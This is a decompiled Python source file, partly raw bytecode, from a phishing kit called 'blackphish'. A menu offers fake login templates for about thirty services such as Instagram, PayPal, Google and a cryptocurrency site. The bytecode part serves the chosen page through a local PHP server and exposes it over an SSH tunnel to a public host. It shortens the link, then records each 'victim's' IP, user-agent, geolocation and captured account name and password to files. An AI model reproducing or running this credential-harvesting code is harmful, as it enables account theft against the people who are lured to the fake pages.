# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 3.10.6 (main, Aug  3 2022, 17:39:45) [GCC 12.1.1 20220730]
# Embedded file name: /data/data/com.termux/files/home/blackphish/files/template.py
# Compiled at: 2020-04-12 01:48:18
# Size of source mod 2**32: 6183 bytes
Instruction context:
-> 
 L. 117       810  LOAD_GLOBAL              exit
                 812  LOAD_CONST               0
                 814  CALL_FUNCTION_1       1  ''
from files.startup import *

def csite():
    O0OOO0OOO000OO000 = input(red + 'Website ' + yellow + '>' + green)
    if O0OOO0OOO000OO000 == '1':
        template('instagram')
    else:
        if O0OOO0OOO000OO000 == '2':
            template('facebook')
        else:
            if O0OOO0OOO000OO000 == '3':
                template('snapchat')
            else:
                if O0OOO0OOO000OO000 == '4':
                    template('twitter')
                else:
                    if O0OOO0OOO000OO000 == '5':
                        template('github')
                    else:
                        if O0OOO0OOO000OO000 == '6':
                            template('google')
                        else:
                            if O0OOO0OOO000OO000 == '7':
                                template('spotify')
                            else:
                                if O0OOO0OOO000OO000 == '8':
                                    template('netflix')
                                else:
                                    if O0OOO0OOO000OO000 == '9':
                                        template('paypal')
                                    else:
                                        if O0OOO0OOO000OO000 == '10':
                                            template('origin')
    if O0OOO0OOO000OO000 == '11':
        template('steam')
    else:
        if O0OOO0OOO000OO000 == '12':
            template('yahoo')
        else:
            if O0OOO0OOO000OO000 == '13':
                template('linkedin')
            else:
                if O0OOO0OOO000OO000 == '14':
                    template('protonmail')
                else:
                    if O0OOO0OOO000OO000 == '15':
                        template('wordpress')
                    else:
                        if O0OOO0OOO000OO000 == '16':
                            template('microsoft')
                        else:
                            if O0OOO0OOO000OO000 == '17':
                                template('instafollowers')
                            else:
                                if O0OOO0OOO000OO000 == '18':
                                    template('pinterest')
                                else:
                                    if O0OOO0OOO000OO000 == '19':
                                        template('cryptocurrency')
                                    else:
                                        if O0OOO0OOO000OO000 == '20':
                                            template('verizon')
                                        elif O0OOO0OOO000OO000 == '21':
                                            template('dropbox')
                                        else:
                                            if O0OOO0OOO000OO000 == '22':
                                                template('adobe')
                                            else:
                                                if O0OOO0OOO000OO000 == '23':
                                                    template('shopify')
                                                else:
                                                    if O0OOO0OOO000OO000 == '24':
                                                        template('messenger')
                                                    else:
                                                        if O0OOO0OOO000OO000 == '25':
                                                            template('gitlab')
                                                        else:
                                                            if O0OOO0OOO000OO000 == '26':
                                                                template('twitch')
                                                            else:
                                                                if O0OOO0OOO000OO000 == '27':
                                                                    template('myspace')
                                                                else:
                                                                    if O0OOO0OOO000OO000 == '28':
                                                                        template('badoo')
                                                                    else:
                                                                        if O0OOO0OOO000OO000 == '29':
                                                                            template('vk')
                                                                        else:
                                                                            if O0OOO0OOO000OO000 == '30':
                                                                                template('yandex')
                                                                            else:
                                                                                if O0OOO0OOO000OO000 == '31':
                                                                                    template('devianart')
                                                                                else:
                                                                                    if O0OOO0OOO000OO000 == '0':
                                                                                        mm()
                                                                                    else:
                                                                                        print('wrong input!')
                                                                                        csite()


def template--- This code section failed: ---

 L.  72         0  LOAD_GLOBAL              os
                2  LOAD_METHOD              system
                4  LOAD_STR                 'clear'
                6  CALL_METHOD_1         1  ''
                8  POP_TOP          

 L.  73        10  LOAD_GLOBAL              int
               12  LOAD_GLOBAL              input
               14  LOAD_STR                 '\x1b[92mPort: \x1b[93m'
               16  CALL_FUNCTION_1       1  ''
               18  CALL_FUNCTION_1       1  ''
               20  STORE_FAST               'OO0OO00O0O00OO000'

 L.  74        22  LOAD_GLOBAL              os
               24  LOAD_METHOD              system
               26  LOAD_STR                 'cd templates/'
               28  LOAD_FAST                'O0O00O00O0OO000O0'
               30  BINARY_ADD       
               32  LOAD_STR                 '/;rm -rf .newvic .scammed ip.txt usernames.txt>/dev/null ;php -S 127.0.0.1:'
               34  BINARY_ADD       
               36  LOAD_GLOBAL              str
               38  LOAD_FAST                'OO0OO00O0O00OO000'
               40  CALL_FUNCTION_1       1  ''
               42  BINARY_ADD       
               44  LOAD_STR                 ' 2> /dev/null >.php.log &'
               46  BINARY_ADD       
               48  CALL_METHOD_1         1  ''
               50  POP_TOP          

 L.  75        52  LOAD_GLOBAL              slow
               54  LOAD_STR                 'Starting PHP Server on '
               56  LOAD_GLOBAL              red
               58  BINARY_ADD       
               60  LOAD_STR                 'http://127.0.0.1:'
               62  BINARY_ADD       
               64  LOAD_GLOBAL              str
               66  LOAD_FAST                'OO0OO00O0O00OO000'
               68  CALL_FUNCTION_1       1  ''
               70  BINARY_ADD       
               72  LOAD_STR                 '\n'
               74  BINARY_ADD       
               76  LOAD_CONST               0.01
               78  CALL_FUNCTION_2       2  ''
               80  POP_TOP          

 L.  76        82  LOAD_GLOBAL              os
               84  LOAD_METHOD              popen
               86  LOAD_STR                 'ssh  -o StrictHostKeyChecking=no -R 80:localhost:'
               88  LOAD_GLOBAL              str
               90  LOAD_FAST                'OO0OO00O0O00OO000'
               92  CALL_FUNCTION_1       1  ''
               94  BINARY_ADD       
               96  LOAD_STR                 ' d4rkgeek8@ssh.localhost.run 2> /dev/null > .log '
               98  BINARY_ADD       
              100  CALL_METHOD_1         1  ''
              102  POP_TOP          

 L.  77       104  LOAD_GLOBAL              os
              106  LOAD_METHOD              system
              108  LOAD_STR                 'sleep 10'
              110  CALL_METHOD_1         1  ''
              112  POP_TOP          

 L.  78       114  LOAD_GLOBAL              os
              116  LOAD_METHOD              popen
              118  LOAD_STR                 'cat .log|cut -d " " -f3'
              120  CALL_METHOD_1         1  ''
              122  LOAD_METHOD              read
              124  CALL_METHOD_0         0  ''
              126  STORE_FAST               'OO00OOO00O0OO0O0O'

 L.  79       128  LOAD_GLOBAL              os
              130  LOAD_METHOD              popen
              132  LOAD_STR                 'cat .log|cut -d " " -f5'
              134  CALL_METHOD_1         1  ''
              136  LOAD_METHOD              read
              138  CALL_METHOD_0         0  ''
              140  STORE_FAST               'OO00000O0O0O000O0'

 L.  80       142  LOAD_GLOBAL              os
              144  LOAD_METHOD              popen
              146  LOAD_STR                 'curl -s http://tinyurl.com/api-create.php\\?url='
              148  LOAD_FAST                'OO00000O0O0O000O0'
              150  BINARY_ADD       
              152  CALL_METHOD_1         1  ''
              154  LOAD_METHOD              read
              156  CALL_METHOD_0         0  ''
              158  STORE_FAST               'OOO00OO00OOOOO00O'

 L.  81       160  LOAD_GLOBAL              print
              162  LOAD_GLOBAL              red
              164  LOAD_STR                 'Original link1:'
              166  BINARY_ADD       
              168  LOAD_GLOBAL              green
              170  BINARY_ADD       
              172  LOAD_FAST                'OO00OOO00O0OO0O0O'
              174  BINARY_ADD       
              176  LOAD_STR                 '\n\r'
              178  BINARY_ADD       
              180  CALL_FUNCTION_1       1  ''
              182  POP_TOP          

 L.  82       184  LOAD_GLOBAL              print
              186  LOAD_GLOBAL              red
              188  LOAD_STR                 'Original link2:'
              190  BINARY_ADD       
              192  LOAD_GLOBAL              green
              194  BINARY_ADD       
              196  LOAD_FAST                'OO00000O0O0O000O0'
              198  BINARY_ADD       
              200  LOAD_STR                 '\n\r'
              202  BINARY_ADD       
              204  CALL_FUNCTION_1       1  ''
              206  POP_TOP          

 L.  83       208  LOAD_GLOBAL              print
              210  LOAD_GLOBAL              red
              212  LOAD_STR                 'Shorted link:'
              214  BINARY_ADD       
              216  LOAD_GLOBAL              green
              218  BINARY_ADD       
              220  LOAD_FAST                'OOO00OO00OOOOO00O'
              222  BINARY_ADD       
              224  LOAD_STR                 '\n'
              226  BINARY_ADD       
              228  CALL_FUNCTION_1       1  ''
              230  POP_TOP          

 L.  84       232  LOAD_GLOBAL              slow
              234  LOAD_STR                 '\n\rWaiting for the Victim.....\r\nHappy Hunting ;)\r\n'
              236  LOAD_CONST               0.1
              238  CALL_FUNCTION_2       2  ''
              240  POP_TOP          

 L.  86   242_244  SETUP_FINALLY       776  'to 776'

 L.  87       246  LOAD_GLOBAL              open
              248  LOAD_STR                 'templates/'
              250  LOAD_FAST                'O0O00O00O0OO000O0'
              252  BINARY_ADD       
              254  LOAD_STR                 '/.newvic'
              256  BINARY_ADD       
              258  CALL_FUNCTION_1       1  ''
              260  STORE_FAST               'OOO0OOO0000O00OO0'

 L.  88       262  LOAD_GLOBAL              print
              264  LOAD_STR                 '\r\nNew Victim XD:\n'
              266  CALL_FUNCTION_1       1  ''
              268  POP_TOP          

 L.  89       270  LOAD_GLOBAL              os
              272  LOAD_METHOD              popen
              274  LOAD_STR                 "grep -a 'IP:' templates/"
              276  LOAD_FAST                'O0O00O00O0OO000O0'
              278  BINARY_ADD       
              280  LOAD_STR                 '/ip.txt | cut -d " " -f2 | tr -d \'\\r\''
              282  BINARY_ADD       
              284  CALL_METHOD_1         1  ''
              286  LOAD_METHOD              read
              288  CALL_METHOD_0         0  ''
              290  STORE_FAST               'O0OO0000OO0O0OO0O'

 L.  90       292  LOAD_GLOBAL              os
              294  LOAD_METHOD              popen
              296  LOAD_STR                 'curl -s https://ipapi.co/'
              298  LOAD_FAST                'O0OO0000OO0O0OO0O'
              300  LOAD_METHOD              replace
              302  LOAD_STR                 '\n'
              304  LOAD_STR                 ''
              306  CALL_METHOD_2         2  ''
              308  BINARY_ADD       
              310  LOAD_STR                 '/json'
              312  BINARY_ADD       
              314  CALL_METHOD_1         1  ''
              316  LOAD_METHOD              read
              318  CALL_METHOD_0         0  ''
              320  STORE_FAST               'O0OO000O0O000OOO0'

 L.  91       322  LOAD_FAST                'O0OO000O0O000OOO0'
              324  LOAD_METHOD              replace
              326  LOAD_STR                 ':'
              328  LOAD_STR                 ':\x1b[1;92m'
              330  CALL_METHOD_2         2  ''
              332  LOAD_METHOD              replace
              334  LOAD_STR                 '\n'
              336  LOAD_STR                 '\n\x1b[1;91m'
              338  CALL_METHOD_2         2  ''
              340  LOAD_METHOD              replace
              342  LOAD_STR                 '"'
              344  LOAD_STR                 ''
              346  CALL_METHOD_2         2  ''
              348  LOAD_METHOD              replace
              350  LOAD_STR                 '{'
              352  LOAD_STR                 ''
              354  CALL_METHOD_2         2  ''
              356  LOAD_METHOD              replace
              358  LOAD_STR                 '}'
              360  LOAD_STR                 ''
              362  CALL_METHOD_2         2  ''
              364  LOAD_METHOD              replace
              366  LOAD_STR                 '\n'
              368  LOAD_STR                 '\n\r'
              370  CALL_METHOD_2         2  ''
              372  STORE_FAST               'OO0OO00000OO00OOO'

 L.  92       374  LOAD_GLOBAL              os
              376  LOAD_METHOD              popen
              378  LOAD_STR                 "grep -a 'User-Agent:' templates/"
              380  LOAD_FAST                'O0O00O00O0OO000O0'
              382  BINARY_ADD       
              384  LOAD_STR                 '/ip.txt | cut -d \'"\' -f2 | tr -d \'\\r\''
              386  BINARY_ADD       
              388  CALL_METHOD_1         1  ''
              390  LOAD_METHOD              read
              392  CALL_METHOD_0         0  ''
              394  STORE_FAST               'OO00O0OO0OO0O0000'

 L.  93       396  LOAD_GLOBAL              slow
              398  LOAD_GLOBAL              red
              400  LOAD_STR                 '\rIP:'
              402  BINARY_ADD       
              404  LOAD_GLOBAL              green
              406  BINARY_ADD       
              408  LOAD_FAST                'O0OO0000OO0O0OO0O'
              410  BINARY_ADD       
              412  LOAD_STR                 '\n'
              414  BINARY_ADD       
              416  LOAD_CONST               0.05
              418  CALL_FUNCTION_2       2  ''
              420  POP_TOP          

 L.  94       422  LOAD_GLOBAL              slow
              424  LOAD_GLOBAL              red
              426  LOAD_STR                 '\rUser-Agent:'
              428  BINARY_ADD       
              430  LOAD_GLOBAL              green
              432  BINARY_ADD       
              434  LOAD_FAST                'OO00O0OO0OO0O0000'
              436  BINARY_ADD       
              438  LOAD_STR                 '\n\r'
              440  BINARY_ADD       
              442  LOAD_CONST               0.05
              444  CALL_FUNCTION_2       2  ''
              446  POP_TOP          

 L.  95       448  LOAD_GLOBAL              slow
              450  LOAD_GLOBAL              green
              452  LOAD_STR                 '\rFootPrinting the IP....\n\r'
              454  BINARY_ADD       
              456  LOAD_CONST               0.1
              458  CALL_FUNCTION_2       2  ''
              460  POP_TOP          

 L.  96       462  LOAD_GLOBAL              slow
              464  LOAD_STR                 '\r'
              466  LOAD_FAST                'OO0OO00000OO00OOO'
              468  BINARY_ADD       
              470  LOAD_STR                 '\n\r'
              472  BINARY_ADD       
              474  LOAD_CONST               0.025
              476  CALL_FUNCTION_2       2  ''
              478  POP_TOP          

 L.  97       480  LOAD_GLOBAL              open
              482  LOAD_STR                 'savedIPs.txt'
              484  LOAD_STR                 'a+'
              486  CALL_FUNCTION_2       2  ''
              488  STORE_FAST               'OOOOOOOO0O0000O00'

 L.  98       490  LOAD_FAST                'OOOOOOOO0O0000O00'
              492  LOAD_METHOD              write
              494  LOAD_STR                 'Scam:'
              496  LOAD_FAST                'O0O00O00O0OO000O0'
              498  BINARY_ADD       
              500  LOAD_STR                 '\n'
              502  BINARY_ADD       
              504  LOAD_FAST                'OO0OO00000OO00OOO'
              506  BINARY_ADD       
              508  CALL_METHOD_1         1  ''
              510  POP_TOP          

 L.  99       512  LOAD_GLOBAL              slow
              514  LOAD_GLOBAL              green
              516  LOAD_STR                 '\n\rSaved IPs in'
              518  BINARY_ADD       
              520  LOAD_GLOBAL              yellow
              522  BINARY_ADD       
              524  LOAD_STR                 ' savedIPs.txt\n\r'
              526  BINARY_ADD       
              528  LOAD_CONST               0.05
              530  CALL_FUNCTION_2       2  ''
              532  POP_TOP          

 L. 101       534  SETUP_FINALLY       730  'to 730'

 L. 102       536  LOAD_GLOBAL              open
              538  LOAD_STR                 'templates/'
              540  LOAD_FAST                'O0O00O00O0OO000O0'
              542  BINARY_ADD       
              544  LOAD_STR                 '/.scammed'
              546  BINARY_ADD       
              548  CALL_FUNCTION_1       1  ''
              550  STORE_FAST               'OOO0OOO0000O00OO0'

 L. 103       552  LOAD_GLOBAL              os
              554  LOAD_METHOD              popen
              556  LOAD_STR                 "grep -o 'Account:.*' templates/"
              558  LOAD_FAST                'O0O00O00O0OO000O0'
              560  BINARY_ADD       
              562  LOAD_STR                 '/usernames.txt | cut -d " " -f2'
              564  BINARY_ADD       
              566  CALL_METHOD_1         1  ''
              568  LOAD_METHOD              read
              570  CALL_METHOD_0         0  ''
              572  STORE_FAST               'O0OOOOOO000OO0OOO'

 L. 104       574  LOAD_GLOBAL              os
              576  LOAD_METHOD              popen
              578  LOAD_STR                 "grep -o 'Pass:.*' templates/"
              580  LOAD_FAST                'O0O00O00O0OO000O0'
              582  BINARY_ADD       
              584  LOAD_STR                 '/usernames.txt | cut -d ":" -f2'
              586  BINARY_ADD       
              588  CALL_METHOD_1         1  ''
              590  LOAD_METHOD              read
              592  CALL_METHOD_0         0  ''
              594  STORE_FAST               'O0OOO0OOOOO0O0OOO'

 L. 105       596  LOAD_GLOBAL              slow
              598  LOAD_STR                 '\nLogin Data is :\n\r'
              600  LOAD_CONST               0.05
              602  CALL_FUNCTION_2       2  ''
              604  POP_TOP          

 L. 106       606  LOAD_GLOBAL              slow
              608  LOAD_STR                 '\n\r'
              610  LOAD_GLOBAL              red
              612  BINARY_ADD       
              614  LOAD_STR                 'Account: '
              616  BINARY_ADD       
              618  LOAD_GLOBAL              green
              620  BINARY_ADD       
              622  LOAD_FAST                'O0OOOOOO000OO0OOO'
              624  BINARY_ADD       
              626  LOAD_CONST               0.05
              628  CALL_FUNCTION_2       2  ''
              630  POP_TOP          

 L. 107       632  LOAD_GLOBAL              slow
              634  LOAD_STR                 '\n\r'
              636  LOAD_GLOBAL              red
              638  BINARY_ADD       
              640  LOAD_STR                 'Pass:'
              642  BINARY_ADD       
              644  LOAD_GLOBAL              green
              646  BINARY_ADD       
              648  LOAD_FAST                'O0OOO0OOOOO0O0OOO'
              650  BINARY_ADD       
              652  LOAD_CONST               0.05
              654  CALL_FUNCTION_2       2  ''
              656  POP_TOP          

 L. 108       658  LOAD_GLOBAL              open
              660  LOAD_STR                 'savedAccounts.txt'
              662  LOAD_STR                 'a+'
              664  CALL_FUNCTION_2       2  ''
              666  STORE_FAST               'OOOOOOOO0O0000O00'

 L. 109       668  LOAD_FAST                'OOOOOOOO0O0000O00'
              670  LOAD_METHOD              write
              672  LOAD_STR                 'Scam:'
              674  LOAD_FAST                'O0O00O00O0OO000O0'
              676  BINARY_ADD       
              678  LOAD_STR                 '\nAccount: '
              680  BINARY_ADD       
              682  LOAD_FAST                'O0OOOOOO000OO0OOO'
              684  BINARY_ADD       
              686  LOAD_STR                 '\nPassword:'
              688  BINARY_ADD       
              690  LOAD_FAST                'O0OOO0OOOOO0O0OOO'
              692  BINARY_ADD       
              694  CALL_METHOD_1         1  ''
              696  POP_TOP          

 L. 110       698  LOAD_GLOBAL              slow
              700  LOAD_GLOBAL              green
              702  LOAD_STR                 '\n\rSaved Data in'
              704  BINARY_ADD       
              706  LOAD_GLOBAL              yellow
              708  BINARY_ADD       
              710  LOAD_STR                 ' savedAccounts.txt\n\r'
              712  BINARY_ADD       
              714  LOAD_CONST               0.05
              716  CALL_FUNCTION_2       2  ''
              718  POP_TOP          

 L. 111       720  POP_BLOCK        
          722_724  BREAK_LOOP          766  'to 766'
              726  POP_BLOCK        
              728  JUMP_BACK           534  'to 534'
            730_0  COME_FROM_FINALLY   534  '534'

 L. 112       730  DUP_TOP          
              732  LOAD_GLOBAL              IOError
              734  COMPARE_OP               exception-match
          736_738  POP_JUMP_IF_FALSE   760  'to 760'
              740  POP_TOP          
              742  POP_TOP          
              744  POP_TOP          

 L. 113       746  LOAD_GLOBAL              slow
              748  LOAD_STR                 'Waiting For Login Data ...\r'
              750  LOAD_CONST               0.1
              752  CALL_FUNCTION_2       2  ''
              754  POP_TOP          
              756  POP_EXCEPT       
              758  JUMP_BACK           534  'to 534'
            760_0  COME_FROM           736  '736'
              760  END_FINALLY      
          762_764  JUMP_BACK           534  'to 534'

 L. 114       766  POP_BLOCK        
          768_770  BREAK_LOOP          810  'to 810'
              772  POP_BLOCK        
              774  JUMP_BACK           242  'to 242'
            776_0  COME_FROM_FINALLY   242  '242'

 L. 115       776  DUP_TOP          
              778  LOAD_GLOBAL              IOError
              780  COMPARE_OP               exception-match
          782_784  POP_JUMP_IF_FALSE   806  'to 806'
              786  POP_TOP          
              788  POP_TOP          
              790  POP_TOP          

 L. 116       792  LOAD_GLOBAL              slow
              794  LOAD_STR                 'Waiting ...\r'
              796  LOAD_CONST               0.1
              798  CALL_FUNCTION_2       2  ''
              800  POP_TOP          
              802  POP_EXCEPT       
              804  JUMP_BACK           242  'to 242'
            806_0  COME_FROM           782  '782'
              806  END_FINALLY      
              808  JUMP_BACK           242  'to 242'

 L. 117       810  LOAD_GLOBAL              exit
              812  LOAD_CONST               0
              814  CALL_FUNCTION_1       1  ''
              816  POP_TOP          

Parse error at or near `LOAD_GLOBAL' instruction at offset 810